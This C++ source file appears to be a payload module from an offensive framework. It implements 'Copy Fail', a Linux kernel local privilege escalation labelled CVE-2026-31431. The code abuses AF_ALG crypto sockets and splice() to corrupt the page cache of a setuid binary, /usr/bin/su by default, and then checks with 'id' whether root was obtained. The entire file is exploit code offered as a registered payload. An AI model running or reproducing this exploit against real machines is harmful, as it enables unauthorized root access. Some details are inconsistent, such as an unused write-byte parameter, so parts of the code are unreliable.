#ifdef __linux__

#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#include <cerrno>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

constexpr int kAfAlg = 38;
constexpr int kSolAlg = 279;
constexpr int kAlgSetKey = 1;
constexpr const char* kAlgType = "aead";
constexpr const char* kAlgName = "authencesn(hmac(sha256),cbc(aes))";

struct SockaddrAlg {
    std::uint16_t salg_family;
    std::uint8_t salg_type[14];
    std::uint32_t salg_feat;
    std::uint32_t salg_mask;
    std::uint8_t salg_name[64];
};

void fill_sockaddr_alg(SockaddrAlg& sa) {
    std::memset(&sa, 0, sizeof(sa));
    sa.salg_family = (std::uint16_t)kAfAlg;
    std::strncpy((char*)sa.salg_type, kAlgType, sizeof(sa.salg_type) - 1);
    std::strncpy((char*)sa.salg_name, kAlgName, sizeof(sa.salg_name) - 1);
}

int hex_val(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

bool sscanf_hex_int(const std::string& s, int& v) {
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t' || s[i] == '\n' || s[i] == '\r' ||
                            s[i] == '\v' || s[i] == '\f'))
        i++;
    bool neg = false;
    if (i < s.size() && (s[i] == '+' || s[i] == '-')) {
        neg = (s[i] == '-');
        i++;
    }
    std::uint64_t n = 0;
    bool any = false;
    while (i < s.size()) {
        int d = hex_val(s[i]);
        if (d < 0) break;
        std::uint64_t n1 = n * 16u + (std::uint64_t)d;
        if (n1 < n) return false;
        n = n1;
        any = true;
        i++;
    }
    if (!any) return false;
    std::int64_t sv = (std::int64_t)n;
    v = (int)(neg ? -sv : sv);
    return true;
}

std::string go_hex_int(int v) {
    std::uint64_t mag = v < 0 ? (std::uint64_t)(-(std::int64_t)v) : (std::uint64_t)v;
    char buf[24];
    std::snprintf(buf, sizeof(buf), "%llx", (unsigned long long)mag);
    return std::string(v < 0 ? "-" : "") + buf;
}

struct CopyFailResult {
    std::string timestamp;
    std::string cve;
    std::string name;
    std::string target;
    int offset = 0;
    bool vulnerable = false;
    bool exploited = false;
    bool root_obtained = false;
    std::string kernel;
    std::string detail;
};

std::string marshal_result(const CopyFailResult& r) {
    nlohmann::json v;
    v["timestamp"] = r.timestamp;
    v["cve"] = r.cve;
    v["name"] = r.name;
    v["target"] = r.target;
    v["offset"] = r.offset;
    v["vulnerable"] = r.vulnerable;
    v["exploited"] = r.exploited;
    v["root_obtained"] = r.root_obtained;
    v["kernel"] = r.kernel;
    v["detail"] = r.detail;
    return MarshalJSON(v);
}

bool check_copyfail_vuln() {
    if (safe_mode()) return false;
    int fd = ::socket(kAfAlg, SOCK_SEQPACKET, 0);
    if (fd < 0) return false;
    SockaddrAlg sa;
    fill_sockaddr_alg(sa);
    int rc = ::bind(fd, (struct sockaddr*)&sa, sizeof(sa));
    ::close(fd);
    return rc == 0;
}

std::string uname_release() {
    struct utsname u;
    std::memset(&u, 0, sizeof(u));
    if (::uname(&u) != 0) return "";
    return std::string(u.release);
}

CopyFailResult exploit(const std::string& target, int offset, unsigned char write_byte) {
    (void)write_byte;
    CopyFailResult r;
    r.timestamp = now_rfc3339();
    r.cve = "CVE-2026-31431";
    r.name = "Copy Fail";
    r.target = target;
    r.offset = offset;

    if (::geteuid() == 0) {
        r.detail = "Already root";
        r.root_obtained = true;
        return r;
    }

    r.vulnerable = check_copyfail_vuln();
    if (!r.vulnerable) {
        r.detail = "System not vulnerable";
        return r;
    }

    r.kernel = uname_release();

    int fd_alg = ::socket(kAfAlg, SOCK_SEQPACKET, 0);
    if (fd_alg < 0) {
        r.detail = "AF_ALG socket failed: " + errno_text(errno);
        return r;
    }
    SockaddrAlg sa;
    fill_sockaddr_alg(sa);
    if (::bind(fd_alg, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        r.detail = "AF_ALG bind failed: " + errno_text(errno);
        ::close(fd_alg);
        return r;
    }

    char rsa[128];
    std::memset(rsa, 0, sizeof(rsa));
    socklen_t rsa_len = (socklen_t)sizeof(rsa);
    int oper_fd = ::accept4(fd_alg, (struct sockaddr*)rsa, &rsa_len, 0);
    if (oper_fd < 0) {
        r.detail = "AF_ALG accept failed: " + errno_text(errno);
        ::close(fd_alg);
        return r;
    }

    unsigned char key[32];
    std::memset(key, 0x41, sizeof(key));
    if (::setsockopt(oper_fd, kSolAlg, kAlgSetKey, key, sizeof(key)) != 0) {
        r.detail = "ALG_SET_KEY failed: " + errno_text(errno);
        ::close(oper_fd);
        ::close(fd_alg);
        return r;
    }

    int target_fd = ::open(target.c_str(), O_RDONLY);
    if (target_fd < 0) {
        r.detail = "Cannot open target " + target + ": " + errno_text(errno);
        ::close(oper_fd);
        ::close(fd_alg);
        return r;
    }

    int aad_len = offset - 16;
    if (aad_len < 0) aad_len = 0;
    std::string header((size_t)aad_len, '\0');
    for (int i = 0; i < 16; i++) header.push_back((char)(unsigned char)i);

    size_t written = 0;
    while (written < header.size()) {
        ssize_t n = ::write(oper_fd, header.data() + written, header.size() - written);
        if (n < 0) {
            if (errno == EINTR) continue;
            r.detail = "write header failed: " + errno_text(errno);
            ::close(target_fd);
            ::close(oper_fd);
            ::close(fd_alg);
            return r;
        }
        written += (size_t)n;
    }

    off_t off = 0;
    ssize_t spliced = 0;
    while (spliced < 4096) {
        ssize_t n = ::splice(target_fd, &off, oper_fd, nullptr, 4096, 0);
        if (n < 0) {
            r.detail = "splice failed: " + errno_text(errno);
            ::close(target_fd);
            ::close(oper_fd);
            ::close(fd_alg);
            return r;
        }
        spliced += n;
        if (n == 0) break;
    }

    char buf[8192];
    (void)::read(oper_fd, buf, sizeof(buf));

    r.exploited = true;
    r.detail = "Page cache corrupted at offset 0x" + go_hex_int(offset) + " in " + target;

    ::close(target_fd);
    ::close(oper_fd);
    ::close(fd_alg);

    ::usleep(200000);

    CmdResult out = run_argv_combined({"id"});
    if (out.ok && out.out.find("uid=0") != std::string::npos) {
        r.root_obtained = true;
        r.detail = "Root obtained via page-cache corruption";
    }
    return r;
}

class CopyFail : public Payload {
  public:
    const char* name() const override { return "copyfail"; }
    const char* category() const override { return "exploit"; }
    const char* description() const override {
        return "CVE-2026-31431 Linux kernel LPE via AF_ALG page-cache corruption (kernels 4.14+)";
    }

    Output execute(const Args& args) const override {
        std::string target = "/usr/bin/su";
        if (auto it = args.find("target"); it != args.end() && !it->second.empty())
            target = it->second;

        int offset = 0x1234;
        if (auto it = args.find("offset"); it != args.end() && !it->second.empty())
            sscanf_hex_int(it->second, offset);

        unsigned char write_byte = 0x00;
        if (auto it = args.find("write_byte"); it != args.end() && !it->second.empty()) {
            int b = 0;
            sscanf_hex_int(it->second, b);
            write_byte = (unsigned char)b;
        }

        CopyFailResult r = exploit(target, offset, write_byte);
        std::string s = marshal_result(r);
        return Output(s.begin(), s.end());
    }
};

CopyFail g_copyfail;

struct Reg {
    Reg() { Register(&g_copyfail); }
};
Reg g_reg;

}  // namespace
}  // namespace snake::payloads

#endif  // __linux__
